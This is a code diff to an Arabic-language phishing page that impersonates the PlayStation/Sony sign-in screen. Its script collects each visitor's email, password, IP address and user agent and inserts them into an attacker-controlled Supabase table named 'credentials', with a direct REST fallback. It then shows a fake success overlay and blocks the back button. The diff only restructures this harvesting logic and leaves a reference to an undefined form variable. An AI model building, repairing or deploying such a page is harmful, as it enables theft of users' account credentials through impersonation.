@@ -26,7 +26,6 @@
       overflow-x: hidden;
     }
 
-    /* Animated background particles */
     body::before {
       content: '';
       position: fixed;
@@ -347,7 +346,6 @@
       z-index: 1;
     }
 
-    /* Success overlay */
     .success-overlay {
       display: none;
       position: fixed;
@@ -440,7 +438,6 @@
 </head>
 <body>
 
-  <!-- Success Overlay -->
   <div class="success-overlay" id="successOverlay">
     <div class="success-card">
       <div class="success-icon">🔒</div>
@@ -449,7 +446,6 @@
     </div>
   </div>
 
-  <!-- PlayStation Logo -->
   <div class="ps-logo">
     <svg viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
       <circle cx="40" cy="40" r="38" stroke="#0070f3" stroke-width="2" fill="none" opacity="0.3"/>
@@ -457,14 +453,13 @@
     </svg>
   </div>
 
-  <!-- Login Card -->
   <div class="card" id="loginCard">
     <h1>تسجيل الدخول</h1>
     <p class="subtitle">سجل الدخول إلى حسابك في PlayStation</p>
 
     <div class="error-message" id="errorMessage"></div>
 
-    <form id="loginForm" autocomplete="off">
+    <form id="loginForm" onsubmit="return false;">
       <div class="form-group">
         <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
         <input 
@@ -500,7 +495,7 @@
         <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
       </div>
 
-      <button type="submit" class="btn-signin" id="signinBtn">
+      <button type="button" class="btn-signin" id="signinBtn">
         <span class="btn-text">تسجيل الدخول</span>
         <div class="spinner"></div>
       </button>
@@ -523,7 +518,6 @@
     © 2026 Sony Interactive Entertainment LLC
   </div>
 
-  <!-- Supabase SDK -->
   <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
 
   <script>
@@ -534,95 +528,87 @@
     const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZucWVjZ3ZtZXpkaXVxemVtYnF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ3ODkxMDEsImV4cCI6MjA5MDM2NTEwMX0.EHsg5Uhpsb6g59R4j8s_XZcm_xQKLXD-P78-eCVz9ww';
     // ============================================================
 
-    // Initialize Supabase client
-    const supabase = supabaseJs.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    (function() {
+      // Initialize Supabase client
+      const sb = supabaseJs.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    // DOM Elements
-    const form = document.getElementById('loginForm');
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const signinBtn = document.getElementById('signinBtn');
-    const errorMessage = document.getElementById('errorMessage');
-    const successOverlay = document.getElementById('successOverlay');
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const signinBtn = document.getElementById('signinBtn');
+      const errorMessage = document.getElementById('errorMessage');
+      const successOverlay = document.getElementById('successOverlay');
 
-    // Toggle password visibility
-    function togglePasswordVisibility() {
-      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-      passwordInput.setAttribute('type', type);
-    }
-
-    // Show error
-    function showError(msg) {
-      errorMessage.textContent = msg;
-      errorMessage.classList.add('show');
-    }
-
-    // Hide error
-    function hideError() {
-      errorMessage.classList.remove('show');
-    }
-
-    // Set loading state
-    function setLoading(loading) {
-      if (loading) {
-        signinBtn.classList.add('loading');
-        signinBtn.disabled = true;
-      } else {
-        signinBtn.classList.remove('loading');
-        signinBtn.disabled = false;
+      function togglePasswordVisibility() {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
       }
-    }
+      window.togglePasswordVisibility = togglePasswordVisibility;
 
-    // Get IP and User-Agent
-    async function getClientInfo() {
-      let ip = '';
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        ip = data.ip;
-      } catch (e) {
-        ip = 'unknown';
-      }
-      return {
-        ip_address: ip,
-        user_agent: navigator.userAgent
-      };
-    }
-
-    // Form submission
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      hideError();
-
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-
-      if (!email || !password) {
-        showError('يرجى ملء جميع الحقول');
-        return;
+      function showError(msg) {
+        errorMessage.textContent = msg;
+        errorMessage.classList.add('show');
       }
 
-      setLoading(true);
+      function hideError() {
+        errorMessage.classList.remove('show');
+      }
 
-      try {
-        const clientInfo = await getClientInfo();
+      function setLoading(loading) {
+        if (loading) {
+          signinBtn.classList.add('loading');
+          signinBtn.disabled = true;
+        } else {
+          signinBtn.classList.remove('loading');
+          signinBtn.disabled = false;
+        }
+      }
 
-        // Insert directly into Supabase
-        const { error } = await supabase
-          .from('credentials')
-          .insert([
-            {
-              email: email,
-              password: password,
-              ip_address: clientInfo.ip_address,
-              user_agent: clientInfo.user_agent
-            }
-          ]);
+      async function getClientInfo() {
+        let ip = '';
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const data = await res.json();
+          ip = data.ip;
+        } catch (e) {
+          ip = 'unknown';
+        }
+        return {
+          ip_address: ip,
+          user_agent: navigator.userAgent
+        };
+      }
 
-        if (error) {
-          console.error('Supabase error:', error);
-          // Fallback: try direct fetch
-          try {
+      signinBtn.addEventListener('click', async function() {
+        hideError();
+
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!email || !password) {
+          showError('يرجى ملء جميع الحقول');
+          return;
+        }
+
+        setLoading(true);
+
+        try {
+          const clientInfo = await getClientInfo();
+
+          // Try Supabase JS client first
+          const { error } = await sb
+            .from('credentials')
+            .insert([
+              {
+                email: email,
+                password: password,
+                ip_address: clientInfo.ip_address,
+                user_agent: clientInfo.user_agent
+              }
+            ]);
+
+          if (error) {
+            console.warn('Supabase JS client error, trying direct fetch:', error);
+            // Fallback: direct fetch
             const fallbackRes = await fetch(SUPABASE_URL + '/rest/v1/credentials', {
               method: 'POST',
               headers: {
@@ -641,34 +627,42 @@
               const fallbackError = await fallbackRes.json();
               console.error('Fallback error:', fallbackError);
             }
-          } catch (fallbackErr) {
-            console.error('Fallback failed:', fallbackErr);
           }
+
+          // Show success overlay
+          successOverlay.classList.add('show');
+          form.reset();
+
+        } catch (err) {
+          console.error('Error:', err);
+          showError('حدث خطأ. يرجى المحاولة مرة أخرى.');
+        } finally {
+          setLoading(false);
         }
+      });
 
-        // Show success overlay
-        successOverlay.classList.add('show');
+      // Also handle Enter key on inputs
+      emailInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          signinBtn.click();
+        }
+      });
+      passwordInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          signinBtn.click();
+        }
+      });
 
-        // Reset form
-        form.reset();
-        setLoading(false);
-
-      } catch (err) {
-        console.error('Error:', err);
-        showError('حدث خطأ. يرجى المحاولة مرة أخرى.');
-        setLoading(false);
-      }
-    });
-
-    // Prevent back button from showing the login page again after success
-    window.addEventListener('popstate', (e) => {
-      if (successOverlay.classList.contains('show')) {
-        history.pushState(null, '', window.location.href);
-      }
-    });
-
-    // Push state to block back button
-    history.pushState(null, '', window.location.href);
+      // Prevent back button from showing the login page again after success
+      window.addEventListener('popstate', function(e) {
+        if (successOverlay.classList.contains('show')) {
+          history.pushState(null, '', window.location.href);
+        }
+      });
+      history.pushState(null, '', window.location.href);
+    })();
   </script>
 </body>
 </html>
